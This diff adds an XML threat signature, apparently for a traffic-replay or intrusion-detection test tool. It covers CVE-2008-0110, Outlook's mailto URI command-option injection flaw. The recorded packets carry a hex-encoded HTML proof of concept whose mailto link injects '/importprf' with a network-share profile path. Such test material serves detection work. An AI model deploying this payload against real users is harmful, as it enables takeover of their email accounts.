@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Office Outlook mailto URI Handling Code Execution"/>
+    <EngDesc display="true" value="A vulnerability exists in the way Microsoft Office Outlook handles mailto URIs. Specifically, the vulnerability is a result of lack of proper URI filtering. When exploited successfully, the vulnerability can lead to arbitrary command execution in the security context of the currently logged in user. An attack targeting this vulnerability can result in the injection of command line options when launching Microsoft Outlook. This may allow the attacker to control the user's email account."/>
+    <Intent display="true">
+      <item value="Command_Execution/Input_Validation_Error"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/POP3/IMAP/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Office_Outlook"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Office_Outlook_2000&amp;2002&amp;2003&amp;2007"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-0110"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="246831d3ef511cad473321b6befd2758"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634007053521590383"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265106606" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="G">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:09:66:AF" destMac="00:07:E9:0A:07:E5" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01F5" Identification="9179" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="05CB" srcIP="172.16.8.156" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1174" destPort="$HTTPdestPort" SeqNumber="9084A5EF" AckNumber="B85A325C" HeaderLength="05" WindowSize="FAF0" Checksum="6C1D" UrgentPointer="0000" Options="" Payload="474554202F7E626C696E2F706F632E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A205475652C203131204D617220323030382032323A30313A313620474D540D0A49662D4E6F6E652D4D617463683A20226462303835372D3132342D3735613161333030220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:09:66:AF" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="019F" Identification="8107" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="5693" srcIP="$destIP" destIP="172.16.8.156" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1174" SeqNumber="B85A325C" AckNumber="9084A7BC" HeaderLength="05" WindowSize="1920" Checksum="9434" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203131204D617220323030382032323A32393A333220474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205475652C203131204D617220323030382032323A32393A303820474D540D0A455461673A20226462303734392D3132362D6439346135353030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203239340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:09:66:AF" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014E" Identification="8109" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="56E2" srcIP="$destIP" destIP="172.16.8.156" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1174" SeqNumber="B85A33D3" AckNumber="9084A7BC" HeaderLength="05" WindowSize="1920" Checksum="5AD3" UrgentPointer="0000" Options="" Payload="3C68746D6C3E0D0A3C626F64793E0D0A50726F6F66206F6620436F6E636570742074656D706C6174653C62723E0D0A436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E793C62723E0D0A416C6C20526967687473205265736572766564093C62723E3C62723E0D0A3C4120687265663D276D61696C746F3A7465737431407672742E74656C75732E636F6D3F222C2D656D62656464696E672C2F696D706F72747072662C5C5C3137322E31362E312E325C7075626C69635C7265706F72745F72657365617263685C46534332303038303331312D31325C746573742E7072662C273E636C69636B20686572653C2F613E0D0A3C2F626F64793E0D0A3C2F68746D6C3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
